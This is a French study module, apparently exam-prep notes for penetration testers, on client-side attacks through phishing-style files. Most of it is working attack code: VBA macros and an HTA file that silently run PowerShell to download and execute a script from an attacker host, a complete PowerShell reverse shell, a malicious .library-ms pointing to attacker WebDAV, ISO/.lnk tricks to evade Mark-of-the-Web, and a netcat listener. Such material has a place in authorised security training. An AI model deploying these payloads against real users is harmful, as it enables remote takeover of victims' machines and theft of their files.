# 10 — Client-Side Attacks

## Objectifs
Obtenir l'exécution de code côté victime : macros Office, fichiers `.lnk`, bibliothèques Windows (`.library-ms`), HTA. En examen c'est rare en cible directe, mais fréquent en scénario AD (phishing interne).

---

## 1. Reconnaissance de la victime

```bash
# Fingerprint client (Quickshot / mailtracker / Canarytokens)
# Objectif : OS, version Office, navigateur, heure de consultation

# Serveur simple pour tracer les ouvertures
python3 -m http.server 80
# Observer User-Agent : Windows NT 10.0, Office 2016, etc.
```

| Info | Conséquence |
|---|---|
| Windows + Office | macro `.docm` |
| Windows sans Office | `.lnk`, `.library-ms`, HTA |
| Navigateur ancien | exploit navigateur |
| Heure ouvrée | envoi crédible |

---

## 2. Macro Microsoft Office

### Générer un document
```bash
# Méthode manuelle : ouvrir Word, Alt+F11, insérer un module
# Méthode scriptée
python3 -m pip install --user docx
```

### Macro VBA (reverse shell PowerShell)
```vba
Sub AutoOpen()
    Shell "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"""
End Sub
```

```vba
' Variante : commande directe
Sub Document_Open()
    Dim s As String
    s = "powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('<LHOST>',4444);..."
    Shell s, vbHide
End Sub
```

### shell.ps1 servi par HTTP
```powershell
$c = New-Object Net.Sockets.TCPClient('<LHOST>',4444)
$s = $c.GetStream()
[byte[]]$b = 0..65535 | %{0}
while (($i = $s.Read($b,0,$b.Length)) -ne 0) {
  $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
  $r = (iex $d 2>&1 | Out-String)
  $r2 = $r + "PS " + (pwd).Path + "> "
  $sb = ([text.encoding]::ASCII).GetBytes($r2)
  $s.Write($sb,0,$sb.Length); $s.Flush()
}
$c.Close()
```

```bash
# Listener
rlwrap nc -lvnp 4444
```

### Éviter la protection
- Enregistrer en `.docm` (macro activée) ou `.doc`.
- Demander à l'utilisateur d'« activer le contenu ».
- Techniques d'évasion AV : voir module 13.

---

## 3. Windows Library Files (`.library-ms`)

Très efficace en interne : un dossier « partagé » qui pointe vers un WebDAV contrôlé.

```xml
<!-- evil.library-ms -->
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://<LHOST>/</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

```bash
# Héberger en WebDAV (nécessaire pour l'exécution)
pip install wsgidav cheroot
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root=/tmp/webdav

# Ajouter un raccourci .lnk pointant vers le .library-ms + un binaire
# (créé sous Windows, ou via script)
```

Chaîne : `.lnk` → `.library-ms` → WebDAV → exécution d'un `.exe` (ou `.lnk` vers PowerShell).

---

## 4. HTA (HTML Application)

```html
<!-- evil.hta -->
<html>
<head><title>Facture</title></head>
<body>
<script language="VBScript">
  Set sh = CreateObject("WScript.Shell")
  sh.Run "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')""", 0
  self.close
</script>
</body>
</html>
```

```bash
# Servir
python3 -m http.server 80
# Lien envoyé : http://<LHOST>/evil.hta
```

---

## 5. Autres vecteurs (bonus)

```bash
# .lnk malveillant (target = powershell)
# Créer sous Windows : clic droit → nouveau raccourci
# Cible : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX(...)"

# ISO / IMG contenant un .lnk (contourne Mark-of-the-Web)
mkisofs -o evil.iso /tmp/payload/

# CHM (hh.exe)
# Execute = powershell ... dans un projet HTML Help
```

---

## 6. Post-exploitation immédiate

```powershell
whoami /all
hostname
ipconfig /all
# Contexte utilisateur : droits, partages, Outlook, fichiers
Get-ChildItem $env:USERPROFILE\Documents -Recurse -Include *.xlsx,*.docx,*.pdf | Select FullName
```

Objectif typique en examen : rebondir vers un serveur interne avec les droits de l'utilisateur piégé.

---

## 7. Pièges

- Macro bloquée par défaut (Mark-of-the-Web) → nécessite « Débloquer » ou un conteneur (ISO).
- WebDAV souvent bloqué en sortie (port 80 TCP sortant requis).
- Office 365 protège les macros depuis Internet : privilégier `.lnk`/`.library-ms` en interne.
- Un reverse shell PowerShell meurt si la session se ferme → utiliser un service ou une tâche planifiée.

---

## 8. Checklist

- [ ] OS/Office de la cible identifiés
- [ ] Payload adapté au vecteur (macro / lnk / library-ms / hta)
- [ ] Serveur HTTP/WebDAV lancé et accessible depuis la cible
- [ ] Listener en écoute
- [ ] Exécution confirmée (callback)
- [ ] Contexte utilisateur énuméré
- [ ] Preuve capturée
